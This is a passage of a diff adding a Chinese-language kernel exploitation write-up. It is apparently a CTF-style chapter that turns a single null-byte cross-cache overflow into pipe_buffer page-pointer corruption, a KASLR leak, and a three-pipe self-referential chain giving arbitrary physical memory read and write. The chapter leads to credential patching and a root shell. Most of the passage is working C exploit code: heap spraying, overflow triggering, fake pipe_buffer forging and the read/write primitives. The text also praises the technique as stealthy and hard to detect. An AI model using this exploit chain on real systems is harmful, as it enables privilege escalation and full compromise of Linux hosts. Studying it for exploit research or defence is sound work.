+    log.info("PHASE 1: ENVIRONMENT INITIALIZATION & DEVICE SETUP         ");
+    log.info("===========================================================");
+    exploit_init();
+    puts("");
+
+    log.info("===========================================================");
+    log.info("PHASE 2: HEAP LAYOUT ORCHESTRATION & SPRAYING              ");
+    log.info("===========================================================");
+    heap_fengshui();
+    puts("");
+
+    log.info("===========================================================");
+    log.info("PHASE 3: CORE EXPLOITATION & MEMORY PRIMITIVES             ");
+    log.info("===========================================================");
+
+    cross_cache_overflow();
+    if (find_corrupted_pipes() < 0) {
+        cleanup_resources();
+        exit(EXIT_FAILURE);
+    }
+    leak_kernel_meta();
+    if (build_arb_primitive() < 0) {
+        cleanup_resources();
+        exit(EXIT_FAILURE);
+    }
+    puts("");
+
+    log.info("===========================================================");
+    log.info("PHASE 4: KERNEL MEMORY RECONNAISSANCE & MAPPING            ");
+    log.info("===========================================================");
+    discover_vmemmap_base();
+    locate_task_structures();
+    puts("");
+
+    log.info("===========================================================");
+    log.info("PHASE 5: ROOT PRIVILEGE ACQUISITION VIA CREDENTIAL PATCHING");
+    log.info("===========================================================");
+    escalate_privileges();
+    puts("");
+
+    log.info("===========================================================");
+    log.info("PHASE 6: POST-EXPLOITATION SHELL EXECUTION                 ");
+    log.info("===========================================================");
+    get_root_shell();
+    puts("");
+
+    cleanup_resources();
+    return 0;
+}
+```
+
+### 7-1. 技术定位：虚拟到物理的跃迁
+
+本章承接第六章单字节溢出的基础成果，但转向更底层的物理页帧操控体系。第六章通过管道共享页泄露内核指针实现虚拟层控制流导向；本章则将共享页转化为**三节点自指涉**的`pipe_buffer`环状链，构建任意物理内存读写原语，直接穿透虚拟地址隔离层，在物理页帧层面完成执行上下文重构。
+
+两者同源于单字节溢出，却因编排差异走向截然不同的分支：前者聚焦虚拟地址博弈与代码执行导向，后者纯靠几何构造实现物理层“原位改写”，展示微扰动在内核底层的级联放大效应。
+
+```mermaid
+graph TD
+    A[单Null字节溢出] --> B{路径分叉};
+
+    B --> C_Chapter6[第六章：共享页泄露 → 虚拟层操控];
+    B --> D_Chapter7[第七章：共享页 → 自指涉链 → 物理层操控];
+
+    C_Chapter6 --> E[控制流导向];
+    D_Chapter7 --> F[物理内存重构];
+
+    subgraph "第七章：物理层操作"
+        D_Chapter7
+        F
+    end
+
+    subgraph "第六章：虚拟层操作"
+        C_Chapter6
+        E
+    end
+
+    style D_Chapter7 fill:#e8f4fd,stroke:#1976d2,stroke-width:3px;
+    style F fill:#e8f4fd,stroke:#1976d2,stroke-width:3px;
+```
+
+> **本质差异**：本章脱离代码执行路径，纯靠`pipe_buffer`几何关系实现物理层数据流重定向。
+
+---
+
+### 7-2. Slab拓扑工程与堆布局
+
+#### 7-2-1. 三层棋盘格内存排布
+
+Phase 2的`heap_fengshui()`实施三层纵深布局，构建精密可控的slab对象拓扑：
+
+```c
+void heap_fengshui(void) {
+    // 第一阶段：128管道阵列基础构建
+    for (int i = 0; i < MAX_PIPES; i++) {
+        create_pipe(i);
+        // 双位置标记体系：前192字节放置魔数与索引
+        pipe_buffer_data[0] = *(size_t*)"BinRacer";  // 头部魔数 0x72656361526e6942
+        pipe_buffer_data[1] = i;                     // 管道索引标识
+        // 后192字节对称放置相同标记，专供二次重叠检测
+        pipe_buffer_data[192/8] = *(size_t*)"BinRacer";   // 后部魔数  0x72656361526e6942
+        pipe_buffer_data[(192/8)+1] = i;                   // 后部索引
+        write(pipe_fds[i][1], pipe_buffer_data, 192 * 2);
+    }
+
+    // 第二阶段：500个Order-0页喷洒制造内存压力
+    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) alloc_page(i, 0x1000, 1);
+
+    // 第三阶段：奇数页释放创造规律空洞
+    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+
+    // 第四阶段：管道缓冲区扩容抢占释放区域
+    for (int i = 0; i < MAX_PIPES; i++) resize_pipe_buffer(i, 0x1000 * 8);
+
+    // 第五阶段：偶数页二次释放锁定靶标页
+    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+}
+```
+
+**布局策略的三层纵深**：
+
+1. **管道阵列基础层**：创建128个管道（`MAX_PIPES=0x80`）构成操作基底。每个管道写入384字节数据，采用**前后对称标记设计**。前192字节标记用于检测null字节溢出造成的初始共享态，后192字节标记为页指针对齐操作后触发的**二次重叠**提供独立检测基准，确保即使前部标记被破坏，仍能通过后部标记识别管道身份。
+
+2. **物理内存压力层**：分配500个Order-0页（`INITIAL_PAGE_SPRAY=500`）占据连续物理区域，随后采用**奇偶交替释放策略**制造规律空洞。先释放奇数页引导管道缓冲区入驻特定slab缓存，再释放偶数页将`pipe_buffer`阵列锚定在与漏洞对象物理相邻的确定区域，形成“管道区–漏洞区”的紧密邻接布局。
+
+3. **隔离防护加固层**：通过`populate_isolated_slab_page()`分配30个隔离slab页，每页填入8个512B漏洞对象，构建溢出辐射缓冲区。隔离层确保null字节溢出只能影响目标管道页面，防止意外污染其他内核数据结构。
+
+```mermaid
+graph TB
+    %% ==================== 左列：宏观布局 ====================
+    subgraph ColumnLeft ["4KB物理页宏观布局"]
+        direction TB
+        A[Buddy空闲页] --> B[管道密集区<br/>kmalloc-512缓存<br/>pipe_buffer×12]
+        B --> C["漏洞对象区<br/>(castaway_t×8)个<br/>512B对象密集阵列"]
+        C --> D[隔离防护区<br/>30个slab页<br/>溢出辐射缓冲]
+        D --> E[安全边界]
+
+        style B fill:#bbdefb,stroke:#1976d2,stroke-width:2px
+        style C fill:#ffcdd2,stroke:#d32f2f,stroke-width:2px
+        style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
+    end
+
+    %% ==================== 右列：微观拓扑（cast优先） ====================
+    subgraph ColumnRight ["512B slab槽微观拓扑"]
+        direction TB
+
+        %% 【调整】cast槽位移至链首
+        J[槽0: cast#0] --> K[槽1: cast#1]
+        K --> L[槽2: cast#2]
+        L --> M[槽3: cast#3]
+        M --> F[槽4: pipe#0]
+        F --> G[槽5: pipe#1]
+        G --> H[槽6: pipe#2]
+        H --> I[槽7: pipe#3]
+
+        %% 内嵌标记体系保持不变
+        subgraph MarkingSystem ["标记体系"]
+            N[前192B:<br/>魔数+索引] --> O[后192B:<br/>魔数+索引]
+
+            style N fill:#e8f5e8,stroke:#388e3c
+            style O fill:#f3e5f5,stroke:#7b1fa2
+        end
+    end
+
+    %% 隐形锚点对齐（消除跨列干扰）
+    linkStyle default opacity:0 stroke-width:0
+```
+
+#### 7-2-2. 双向标记体系的战略作用
+
+管道数据的384字节布局采用**前后分区标记设计**，每一标记单元承载明确的阶段性使命：
+
+```c
+// Phase 2: heap_fengshui()中的标记初始化
+for (int i = 0; i < MAX_PIPES; i++) {
+    create_pipe(i);
+    // 前192字节标记单元：占据管道数据起始16字节
+    pipe_buffer_data[0] = *(size_t*)"BinRacer";  // 头部魔数 0x72656361526e6942
+    pipe_buffer_data[1] = i;                     // 当前管道索引
+
+    // 后192字节标记单元：偏移192字节处的独立标记区
+    pipe_buffer_data[192/8] = *(size_t*)"BinRacer";   // 后半部分魔数 0x72656361526e6942
+    pipe_buffer_data[(192/8)+1] = i;                  // 后半部分索引
+
+    write(pipe_fds[i][1], pipe_buffer_data, 192 * 2);
+}
+```
+
+**标记设计的阶段化分工**：
+
+1. **前部标记（0–15字节）**：位于管道数据起始处，当null字节溢出破坏相邻`pipe_buffer`结构体的`page`指针低位字节时，会导致两个不同管道的`pipe_buffer`误指向同一个物理页。此时，通过读取各管道数据区前192字节内保存的魔数与索引，可检测出**同一物理页被两个管道意外共享**的异常状态，从而精确定位受溢出影响的`first_victim_pipe_index`与`first_overlap_pipe_index`。
+
+2. **后部标记（192–207字节）**：深嵌管道数据中段，与前部标记保持192字节的安全距离。该区域在常规读写中不被触及，保留原始管道身份信息。当页指针对齐操作引发**二次内存重叠**时，前部标记可能因缓冲区偏移写入而失效，后部标记则成为`build_arb_primitive()`阶段**二次混淆检测**的关键参照，确保在复杂内存破坏下仍能识别`second_victim_pipe_index`与`second_overlap_pipe_index`。
+
+后192字节标记绝非“跨溢出区保护”或“冗余校验”，而是为二次拓扑重构预置的**独立检测锚点**。两次检测阶段使用完全独立的标记区域，避免单次内存破坏导致检测体系崩溃。
+
+```mermaid
+flowchart TD
+    %% ==================== 左列：战术时序 ====================
+    subgraph Col1 ["标记战术时序"]
+        direction TB
+        A[Phase 3-B: 首次检测] --> B[读取前40字节<br/>比照前部标记]
+        B --> C{魔数匹配且索引异常?}
+        C -->|是| D[定位first_victim/overlap]
+
+        E[Phase 3-D: 二次检测] --> F[从192偏移读取40字节<br/>比照后部标记]
+        F --> G{魔数匹配且索引异常?}
+        G -->|是| H[定位second_victim/overlap]
+
+        style D fill:#bbdefb,stroke:#1976d2,stroke-width:2px
+        style H fill:#ffcc80,stroke:#f57c00,stroke-width:2px
+    end
+
+    %% ==================== 右列：物理布局 ====================
+    subgraph Col2 ["标记物理布局"]
+        direction TB
+        I[管道数据空间] --> J[0-15B: 前部标记<br/>首次检测基准]
+        J --> L[易受溢出波及]
+        I --> K[192-207B: 后部标记<br/>二次检测基准]
+        K --> M[深埋数据区<br/>溢出幸存率高]
+    end
+
+    %% 消除跨列隐形连线干扰
+    linkStyle default opacity:0 stroke-width:0
+```
+
+### 7-3. 单字节溢出与共享态构造
+
+#### 7-3-1. 极简Null植入的物理语义转换
+
+Phase 3-A的`cross_cache_overflow()`以最小扰动实现最大效果：
+
+```c
+void cross_cache_overflow(void) {
+    // 隔离层填充：30页×8对象=240个漏洞对象
+    for (int i = 0; i < FINAL_PAGE_SPRAY; i++)
+        populate_isolated_slab_page(isolated_slab_pages, i);
+
+    // 512字节溢出载荷构造：仅末字节置零
+    memset(overflow_payload, 0, CHUNK_SIZE);
+    size_t null_address = 0x00;
+
+    // 关键操作：向castaway_t尾部写入6字节，实际仅需1字节null
+    memcpy(&overflow_payload[CHUNK_SIZE - 6], &null_address, 6);
+
+    // 触发跨缓存溢出，影响隔离页0的8个对象
+    modify_isolated_slab_page(isolated_slab_pages, 0, overflow_payload, CHUNK_SIZE - 5);
+}
+```
+
+**单字节的物理语义转换**：
+
+1. **原始指针状态**：相邻`pipe_buffer`的`page`指针存储物理页帧地址，典型格式为`0xFFFFxxxxyyyyyyZZ`，其中`ZZ`表示页内低8位偏移，值域`0x00–0xF8`（512B对齐）。
+
+2. **Null字节效应**：向`castaway_t`尾部溢出1字节null（`0x00`）覆盖`pipe_buffer->page`最低字节，将指针变为`0xFFFFxxxxyyyyyy00`。这一变换引发**物理页共享态**：两个原本指向不同物理页的`pipe_buffer`现在指向同一物理页的不同512B槽位。
+
+3. **非对称共享特性**：
+    - **主控管道**：`pipe_buffer_A`指向物理页`P`偏移`0x00`，保持原始`offset/len`元数据
+    - **受扰管道**：`pipe_buffer_B`原本指向物理页`Q`偏移`0xA8`，现指向页`P`偏移`0x00`
+    - **结果**：两管道共享物理页`P`但控制不同区域，形成“一页双控”的脆弱平衡
+
+```mermaid
+flowchart TD
+    A[溢出前状态] --> B[pipe_buffer_A<br/>page=0xFFFFxxxxyyyyyyA8<br/>物理页P偏移A8];
+    A --> C[pipe_buffer_B<br/>page=0xFFFFxxxxzzzzzz00<br/>物理页Q偏移00];
+
+    B -->|Null字节溢出| D[pipe_buffer_A不变];
+    C -->|末字节00覆盖| E[pipe_buffer_B<br/>page=0xFFFFxxxxzzzzzz00→0xFFFFxxxxyyyyyy00];
+
+    D --> F[共享态建立<br/>同指物理页P];
+    E --> F;
+
+    F --> G[非对称控制<br/>A控偏移A8区域<br/>B控偏移00区域];
+    style E fill:#ffebee,stroke:#d32f2f;
+    style F fill:#e8f4fd,stroke:#1976d2;
+```
+
+#### 7-3-2. 悬空引用态的冻结与利用
+
+当检测到受扰管道（`first_victim_pipe_index`）时，立即关闭其文件描述符：
+
+```c
+// 在leak_kernel_meta()中执行
+close(pipe_fds[first_victim_pipe_index][0]);
+close(pipe_fds[first_victim_pipe_index][1]);
+```
+
+**这一操作的深层影响**：
+
+1. **物理页释放**：内核执行`pipe_release()`→`free_pipe_info()`路径，将共享物理页`P`释放回Buddy分配器的order-0空闲链表。但由于主控管道（`first_overlap_pipe_index`）仍持有`page`指针，形成**悬空引用**（dangling reference）。
+
+2. **堆喷抢占窗口**：释放后的order-0页成为`kmalloc`分配的高优先级目标。后续通过`resize_pipe_buffer()`触发`kmalloc-192`堆喷，新分配的`pipe_buffer`数组将抢占该物理页，使悬空指针指向活跃的内核对象。
+
+3. **控制链形成**：`first_overlap_pipe_index`的悬空`page`指针与新入驻的`kmalloc-192`对象共享物理页，建立**一级控制链**——通过主控管道可读写新`pipe_buffer`数组的内容。
+
+**技术洞察**：释放操作非资源清理，而是**状态转换触发器**，将被动溢出转为主动控制的起点。
+
+### 7-4. 损坏诊断与内核坐标系建立
+
+#### 7-4-1. 首次溢出检测的精准机制
+
+`find_corrupted_pipes()`函数执行首次溢出检测，其流程经过精心设计以准确捕获null字节溢出引发的初始混淆状态：
+
+```c
+int find_corrupted_pipes(void) {
+    log.info("Inspecting pipe array for metadata corruption caused by overflow...");
+
+    for (int i = 0; i < MAX_PIPES; i++) {
+        // 清空读取缓冲区
+        memset(pipe_buffer_data, 0, 192);
+
+        // 关键步骤1：读取pipe_buffer结构体的前40字节
+        read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+        // 检测逻辑：验证前部魔数和索引一致性
+        if (pipe_buffer_data[0] == 0x72656361526e6942 && pipe_buffer_data[1] != i) {
+            first_victim_pipe_index = pipe_buffer_data[1];
+            first_overlap_pipe_index = i;
+
+            if (debug_enabled) {
+                hex_dump("Corrupted pipe_buffer metadata dump:", (char *)pipe_buffer_data, PIPE_BUFFER_SIZE + 0x8);
+            }
+            log.success("Found corruption pair - Victim pipe: %d, Controller pipe: %d",
+                       first_victim_pipe_index, first_overlap_pipe_index);
+        }
+
+        // 关键步骤2：消耗剩余前部数据，移动读指针
+        read(pipe_fds[i][0], pipe_buffer_data, 192 - PIPE_BUFFER_SIZE);
+    }
+
+    if (first_overlap_pipe_index == -1) {
+        log.error("No pipe corruption detected - cross-cache overflow failed to land");
+        return -1;
+    }
+    return 0;
+}
+```
+
+**检测流程的精准设计**：
+
+1. **首次读取**：`read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE)`读取`pipe_buffer->page`结构体的前40字节。由于null字节溢出，某些`pipe_buffer->page`结构体与**其他管道的管道数据缓冲区**发生内存重叠，读取到的实际是**重叠管道的前部标记**。
+
+2. **检测逻辑**：当检测到魔数正确但索引不匹配时，表明当前`pipe_buffer->page`结构体被另一管道的管道数据重叠。`pipe_buffer_data[1]`存储的是**原始管道所有者索引**，即`first_victim_pipe_index`；当前管道索引`i`是**控制者索引**，即`first_overlap_pipe_index`。
+
+3. **读指针管理**：`read(pipe_fds[i][0], pipe_buffer_data, 192 - PIPE_BUFFER_SIZE)`读取剩余的152字节，将每个管道的读指针精确移动到**192字节偏移处**，即后部标记的起始位置。这一操作至关重要，为后续的二次检测建立一致的读取基准。
+
+```mermaid
+flowchart TD
+    A[遍历128个管道] --> B[读取pipe_buffer结构体40字节]
+    B --> C{魔数匹配且索引异常?}
+    C -->|是| D[发现混淆对]
+    C -->|否| E[正常管道]
+
+    D --> F["first_victim_pipe_index = pipe_buffer_data下标1值"]
+    D --> G["first_overlap_pipe_index = i"]
+
+    E --> H[消耗剩余前部数据]
+    D --> H
+
+    H --> I[读指针移动到192字节偏移]
+
+    style H fill:#ffcc80,stroke:#f57c00,stroke-width:2px
+    style I fill:#c8e6c9,stroke:#388e3c,stroke-width:2px
+```
+
+```mermaid
+flowchart TD
+    %% ==================== 左列：读指针状态演变 ====================
+    subgraph Col1 ["读指针状态演变"]
+        direction TB
+        J[检测前: 读指针在0字节] --> K[首次读取后: 在40字节]
+        K --> L[消耗剩余后: 在192字节]
+        L --> M[为二次检测建立基准]
+    end
+
+    %% ==================== 右列：内存重叠检测机制 ====================
+    subgraph Col2 ["内存重叠检测机制"]
+        direction TB
+        N[管道X pipe_buffer结构体] --> O[与管道Y数据区重叠]
+        O --> P[读取时得到管道Y的前部标记]
+        P --> Q[魔数验证通过]
+        P --> R[索引Y ≠ 当前索引X]
+        Q --> S[确定混淆关系]
+        R --> S
+    end
+
+    %% 消除跨列隐形连线干扰
+    linkStyle default opacity:0 stroke-width:0
+```
+
+#### 7-4-2. 一级控制链的主动构造与内核基址锚定
+
+Phase 3-C的`leak_kernel_meta()`执行坐标系建立与一级控制链强化：
+
+```c
+void leak_kernel_meta(void) {
+    // 释放受扰管道，将共享物理页归还Buddy order-0空闲列表
+    close(pipe_fds[first_victim_pipe_index][0]);
+    close(pipe_fds[first_victim_pipe_index][1]);
+
+    // 关键步骤：调整存活管道大小为0x1000*4=16384字节
+    // 触发内核在kmalloc-192缓存分配pipe_buffer数组，抢占刚释放的物理页
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if (i == first_victim_pipe_index || i == first_overlap_pipe_index) continue;
+        resize_pipe_buffer(i, 0x1000 * 4);  // kmalloc-192堆喷
+    }
+
+    // 读取主控管道pipe_buffer，泄露内核元数据
+    memset(pipe_buffer_data, 0, PIPE_BUFFER_SIZE);
+    read(pipe_fds[first_overlap_pipe_index][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+    // 提取pipe_buffer结构体字段
+    struct pipe_buffer leaked_pipe_buf = {0};
+    leaked_pipe_buf.page = (struct page *)pipe_buffer_data[0];
+    leaked_pipe_buf.ops = (struct pipe_buf_operations *)pipe_buffer_data[2];
+    // ... 其他字段提取
+
+    // 内核基址计算：从pipe_buffer->ops指针推算
+    kernel_offset = pipe_buffer_data[2] - ANON_PIPE_BUF_OPS;
+    kernel_base += kernel_offset;
+
+    // 核心对齐操作：清空page指针低8位，人为制造二次重叠
+    memset(&primary_fake_pipe_buf, 0, PIPE_BUFFER_SIZE);
+    memcpy(&primary_fake_pipe_buf, &leaked_pipe_buf, PIPE_BUFFER_SIZE);
+    primary_fake_pipe_buf.page = (struct page *)((uint64_t)(primary_fake_pipe_buf.page) & (~0xff));
+
+    // 将对齐后的pipe_buffer写回主控管道，主动构造控制链
+    write(pipe_fds[first_overlap_pipe_index][1], &primary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+}
+```
+
+**关键步骤的物理语义**：
+
+1. **kmalloc-192堆喷抢占**：
+    - `resize_pipe_buffer(..., 0x1000*4)`迫使内核在`kmalloc-192`缓存分配新`pipe_buffer`数组
+    - 新分配数组优先占用刚释放的order-0物理页，使`first_overlap_pipe_index`的悬空`page`指针自动指向新入驻的`kmalloc-192`对象
+    - **一级控制链激活**：主控管道获得对新`pipe_buffer`数组的读写能力
+
+2. **元数据泄露**：从主控管道读取的`pipe_buffer_data[2]`（`ops`指针）指向静态内核符号`anon_pipe_buf_ops`，结合预定义静态地址`ANON_PIPE_BUF_OPS`，解算KASLR偏移，建立内核虚拟地址坐标系。
+
+3. **主动重叠构造**：
+    - `primary_fake_pipe_buf.page & (~0xff)`清空低8位，强制指针对齐到4KB页起始边界
+    - 写回操作修改内核中`first_overlap_pipe_index`的`pipe_buffer->page`指针
+    - 对齐后的指针大概率与系统中其他管道的原始`pipe_buffer`物理页重合，**人为制造二次重叠**
+    - 此举旨在扩大控制面，为二级控制链铺路
+
+```mermaid
+flowchart TB
+    %% ==================== 右列：主动重叠制造 ====================
+    subgraph Col2 ["主动重叠制造"]
+        direction TB
+        G[原始page指针<br/>含随机低8位] --> H[&~0xff对齐操作]
+        H --> I[4KB页边界对齐指针]
+        I --> J[写回内核pipe_buffer.page]
+        J --> K[高概率匹配它pipe_buffer原始页]
+        K --> L[人为二次重叠达成]
+
+        style L fill:#ffcc80,stroke:#f57c00,stroke-width:2px
+    end
+
+    %% ==================== 左列：一级控制链构造 ====================
+    subgraph Col1 ["一级控制链构造"]
+        direction TB
+        A[释放first_victim管道] --> B[物理页回归Buddy order-0]
+        B --> C[resize管道→kmalloc-192堆喷]
+        C --> D[新pipe_buffer数组入驻释放页]
+        D --> E[first_overlap悬空指针指向活跃对象]
+        E --> F[一级控制链确立]
+
+        style F fill:#bbdefb,stroke:#1976d2,stroke-width:2px
+    end
+
+    %% 消除跨列隐形连线干扰
+    linkStyle default opacity:0 stroke-width:0
+```
+
+#### 7-4-3. 二次重叠检测与二级控制链确立
+
+在`build_arb_primitive()`中检测主动构造的二次重叠：
+
+```c
+int build_arb_primitive(void) {
+    // 二次检测：从192字节偏移读取pipe_buffer结构体
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if (i == first_victim_pipe_index || i == first_overlap_pipe_index) continue;
+
+        memset(pipe_buffer_data, 0, PIPE_BUFFER_SIZE);
+        read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+        // 检测对齐操作引发的二次重叠：验证后部标记
+        if (pipe_buffer_data[0] == 0x72656361526e6942 && pipe_buffer_data[1] != i) {
+            second_victim_pipe_index = pipe_buffer_data[1];  // 被重叠的原始管道
+            second_overlap_pipe_index = i;                   // 重叠控制管道
+
+            log.success("Located secondary corruption pair - Victim pipe: %d, Controller pipe: %d",
+                       second_victim_pipe_index, second_overlap_pipe_index);
+        }
+    }
+}
+```
+
+**二次重叠的物理实质**：
+
+- `second_overlap_pipe_index`管道的`pipe_buffer->page`结构体，因对齐操作与`second_victim_pipe_index`管道的后部标记区域重叠
+- 读取时获取受害管道后部标记，通过索引异常识别重叠关系
+- **二级控制链确立**：`second_overlap_pipe_index`可直接控制后续堆喷管道的`pipe_buffer`元数据
+
+#### 7-4-4. 三级链节点的几何筛选与闭环构建
+
+```c
+// 释放二次受害管道，为三级链腾出空间
+close(pipe_fds[second_victim_pipe_index][0]);
+close(pipe_fds[second_victim_pipe_index][1]);
+
+// 关键：调整为0x1000*8大小，触发kmalloc-512堆喷
+for (int i = 0; i < MAX_PIPES; i++) {
+    if (i == first_victim_pipe_index || i == first_overlap_pipe_index ||
+        i == second_victim_pipe_index || i == second_overlap_pipe_index) continue;
+    resize_pipe_buffer(i, 0x1000 * 8);  // kmalloc-512堆喷，抢占释放页
+}
+
+// 512字节对齐填充：跨越192字节数据区，定位相邻pipe_buffer
+memset(pipe_buffer_data, 0, 512);
+write(pipe_fds[second_overlap_pipe_index][1], pipe_buffer_data, 512 - 192 * 2);
+
+// 伪造二级pipe_buffer指向锚点页偏移512
+memset(&secondary_fake_pipe_buf, 0, PIPE_BUFFER_SIZE);
+memcpy(&secondary_fake_pipe_buf, &primary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+secondary_fake_pipe_buf.offset = 512;  // 指向同页第二个512B槽位
+write(pipe_fds[second_overlap_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+// 几何筛选：寻找同页自指涉管道
+for (int i = 0; i < MAX_PIPES; i++) {
+    if (i == first_victim_pipe_index || i == first_overlap_pipe_index ||
+        i == second_victim_pipe_index || i == second_overlap_pipe_index) continue;
+
+    read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+    // 4KB页可容纳8个512B pipe_buffer，必然存在同页管道
+    if (pipe_buffer_data[0] == (size_t)primary_fake_pipe_buf.page) {
+        if (self_second_pipe_index == -1) self_second_pipe_index = i;
+        else if (self_third_pipe_index == -1) self_third_pipe_index = i;
+        else if (self_fourth_pipe_index == -1) self_fourth_pipe_index = i;
+    }
+}
+```
+
+**三级链的物理必然性**：
+
+- 4KB物理页正好容纳8个512B对象（`pipe_buffer`结构体）
+- 通过`kmalloc-512`堆喷抢占释放页，必然在同页填充多个管道
+- 自指涉节点通过`page`指针匹配锚点页地址自然发现，**几何确定性取代概率博弈**
+
+#### 7-4-5. 三节点互控闭环的精确定义
+
+```c
+void configure_arbitrary_operations(void) {
+    // 链节2→链节3：配置self_second管道修改self_third管道的pipe_buffer
+    secondary_fake_pipe_buf.offset = 512 * 3;  // 指向同页第四个槽位（链节4）
+    write(pipe_fds[self_second_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // 链节3→链节4：配置self_third管道修改self_fourth管道的pipe_buffer
+    secondary_fake_pipe_buf.offset = 512;      // 指向同页第二个槽位（链节2）
+    write(pipe_fds[self_third_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // 链节4→链节2：配置self_fourth管道修改self_second管道的pipe_buffer
+    secondary_fake_pipe_buf.offset = 0;
+    write(pipe_fds[self_fourth_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // 对齐填充维持512B间距，确保后续写入不破坏拓扑
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[self_fourth_pipe_index][1], pipe_buffer_data, 512 - PIPE_BUFFER_SIZE);
+
+    // 链节4→链节3：将链节3的pipe_buffer还原为正常状态，闭合环路
+    secondary_fake_pipe_buf.offset = 512 * 3;
+    write(pipe_fds[self_fourth_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+}
+```
+
+**互控闭环的拓扑真义**：
+
+- **链节2（self_second_pipe_index）**：任意读写载体。通过修改链节3的`pipe_buffer`，将配置传递给下一环节，自身`pipe_buffer`被链节4动态重定向。
+- **链节3（self_third_pipe_index）**：配置传递中介。接收链节2的配置，修改链节4的`pipe_buffer`指向目标，最终由链节4将其还原为正常状态，维持环路稳定。
+- **链节4（self_fourth_pipe_index）**：闭环控制枢纽。接收链节3的配置，修改链节2的`pipe_buffer`实现物理地址重定向；完成后还原链节3的状态，使链条可重复使用。
+- **循环互控**：三管道依次修改下一环节的`pipe_buffer`，链节4同时承担链节3的状态恢复，形成**可复位闭环**，无需外部干预即可维持拓扑。
+
+```mermaid
+flowchart LR
+    P2[链节2: 读写载体<br/>pipe_buffer被P4修改] -->|read/write| SYS[物理内存];
+    P2 -->|配置传递| P3[链节3: 配置中介<br/>修改P4的pipe_buffer];
+
+    P3 -->|配置传递| P4[链节4: 闭环枢纽<br/>修改P2的pipe_buffer + 还原P3状态];
+    P4 -->|重定向| P2;
+    P4 -.->|状态还原| P3;
+
+    style P2 fill:#bbdefb,stroke:#1976d2,stroke-width:2px;
+    style P3 fill:#c8e6c9,stroke:#388e3c,stroke-width:2px;
+    style P4 fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px;
+```
+
+### 7-5. 任意物理读写原语实现
+
+链成型后，通过动态改写链中`pipe_buffer`的`page`指针与`offset`，将管道I/O透明路由到任意物理地址：
+
+```c
+void arbitrary_physical_read(uint64_t target_page, uint32_t page_offset, void *output_buffer, uint64_t read_length) {
+    // 阶段1：复位链节4到已知对齐状态
+    arb_read_pipe_buf.offset = 512;
+    arb_read_pipe_buf.len = 0;
+    write(pipe_fds[self_third_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // 阶段2：重定向链节2到目标物理地址
+    arb_read_pipe_buf.page = (struct page*)target_page;
+    arb_read_pipe_buf.offset = page_offset;
+    arb_read_pipe_buf.len = 0xfff;  // 最大长度限制
+    write(pipe_fds[self_fourth_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // 阶段3：刷新对齐填充，维持管道缓冲区布局
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[self_fourth_pipe_index][1], pipe_buffer_data, 512 - PIPE_BUFFER_SIZE);
+
+    // 阶段4：恢复链节3到安全状态，保持重定向
+    arb_read_pipe_buf.page = primary_fake_pipe_buf.page;
+    arb_read_pipe_buf.offset = 512 * 3;
+    arb_read_pipe_buf.len = 0;
+    write(pipe_fds[self_fourth_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // 阶段5：通过链节2读取目标物理数据
+    read(pipe_fds[self_second_pipe_index][0], output_buffer, read_length);
+}
+```
+
+**原语实现的多阶段设计**：
+
+1. **状态准备**：复位链节4，确保路由起点已知。这类似路由器重启，清除可能的状态残留。
+
+2. **目标重定向**：修改链节2的`page`指针指向目标物理页，`offset`设置目标页内偏移。这是**物理地址注入点**，将虚拟的管道I/O映射到实际物理内存。
+
+3. **拓扑维护**：写入对齐填充数据，维持管道缓冲区的512B对齐布局。防止因数据长度变化破坏链结构。
+
+4. **路由恢复**：恢复链节3的配置，保持转发功能正常。确保数据在环内正确流动。
+
+5. **数据提取**：通过链节2执行实际读取，数据沿重定向路径从目标物理地址流回用户空间。
+
+```mermaid
+flowchart TD
+    A[调用物理读原语] --> B[重定向链节2到目标物理页];
+    B --> C[维持链拓扑对齐];
+    C --> D[发起读操作];
+    D --> E[数据流: 目标物理页→链节2→用户缓冲区];
+    E --> F[返回读取数据];
+```
+
+**写原语的对称实现**：
+
+```c
+void arbitrary_physical_write(uint64_t target_page, uint32_t page_offset, void *input_data, uint64_t write_length) {
+    // 相似的重定向流程
+    // ...
+
+    // 关键差异：最后阶段执行写操作
+    write(pipe_fds[self_second_pipe_index][1], input_data, write_length);
+}
+```
+
+写原语遵循相同路由逻辑，区别在于数据流向：用户数据→链节2→目标物理地址。这种对称性简化了实现，提高了原语的统一性。
+
+**原语的技术特性**：
+
+1. **透明性**：用户像操作普通管道一样使用原语，无需了解底层物理细节。重定向对用户透明，简化了上层利用逻辑。
+
+2. **原子性**：每次操作独立配置和恢复路由，避免状态残留。操作间相互隔离，提高可靠性。
+
+3. **通用性**：支持任意物理地址和任意长度（受管道缓冲区限制）。可访问内核态、用户态、设备内存等所有物理映射区域。
+
+4. **隐蔽性**：操作不触发缺页异常、权限检查等虚拟层事件。在系统日志中表现为普通管道I/O，难以检测。
+
+### 7-6. 物理内存勘探与对象定位
+
+#### 7-6-1. vmemmap基址的梯度扫描
+
